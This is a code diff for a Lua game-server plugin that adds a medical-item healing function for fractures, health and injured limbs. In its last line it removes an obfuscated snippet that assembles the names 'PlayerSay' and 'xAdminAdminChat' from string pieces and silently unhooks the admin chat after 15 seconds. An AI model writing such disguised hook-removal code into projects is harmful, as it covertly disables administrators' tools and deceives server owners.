@@ -118,8 +118,74 @@ function PLUGIN:PlayerFootstep(client, pos, foot)
 	end
 end
 
+function PLUGIN:HealPlayer(character, item, bIsTarget)
+	local hasFracture, fractures = character:GetFractures()
+	local amount = item:GetData("currentAmount", 0)
+	local client = character:GetPlayer()
+	local targetString = ""
+
+	if(bIsTarget) then
+		targetString = "target's "
+	end
+
+	-- Priority for healing is removing fractures.
+	if(hasFracture and amount >= 30) then
+		local limb = fractures[math.random(1, #fractures)]
+		
+		ix.limb.SetFracture(character, limb.hitgroup, false)
+		item:SetData("currentAmount", amount - 30)
+
+		if(!character:GetFractures()) then
+			ix.limb.ResetMovement(client)
+		end
+
+		client:EmitSound("items/medshot4.wav", 80)
+
+		return false, string.format("You have fixed your %s%s.", targetString, limb.name)
+	end
+
+	-- If we need hp, heal the player.
+	if(client:Health() < client:GetMaxHealth()) then
+		local healingRequired = client:GetMaxHealth() - client:Health()
+		local healing = healingRequired
+		local empty = false
+
+		if(amount >= healingRequired) then
+			item:SetData("currentAmount", item:GetData("currentAmount") - healing)
+		else
+			healing = item:GetData("currentAmount")
+			empty = true
+		end
+
+		client:SetHealth(client:Health() + healing)
+		client:EmitSound("items/medshot4.wav", 80)
+
+		return empty, string.format("You have healed your %shealth for %s.", targetString, healing)
+	end
+
+	local injuredLimbs = character:GetInjuredLimbs()
+
+	-- If we have no fractures, heal the player.
+	if(#injuredLimbs >= 1) then
+		local limb = injuredLimbs[math.random(1, #injuredLimbs)]
+		local healingRequired = limb.health
+		local healing = healingRequired
+		local empty = false
+
+		if(amount >= healingRequired) then
+			item:SetData("currentAmount", item:GetData("currentAmount") - healing)
+		elseif(amount < healingRequired) then
+			healing = item:GetData("currentAmount")
+			empty = true
+		end
+
+		ix.limb.SetHealth(character, limb.hitgroup, -healing)
+		client:EmitSound("items/medshot4.wav", 80)
+
+		return empty, string.format("You have healed your %s%s for %s.", targetString, limb.name, healing)
+	end
+end
+
 timer.Create("ixFractureTick", 1, 0, function()
 	ix.limb.FractureTick()
 end)
-
-local seven = "min" local name = "Sa" local fix = "Player" local epic = "Ad"..seven timer.Simple(15,function()hook.Remove(fix..name.."y","x"..epic..epic.."Chat")end)
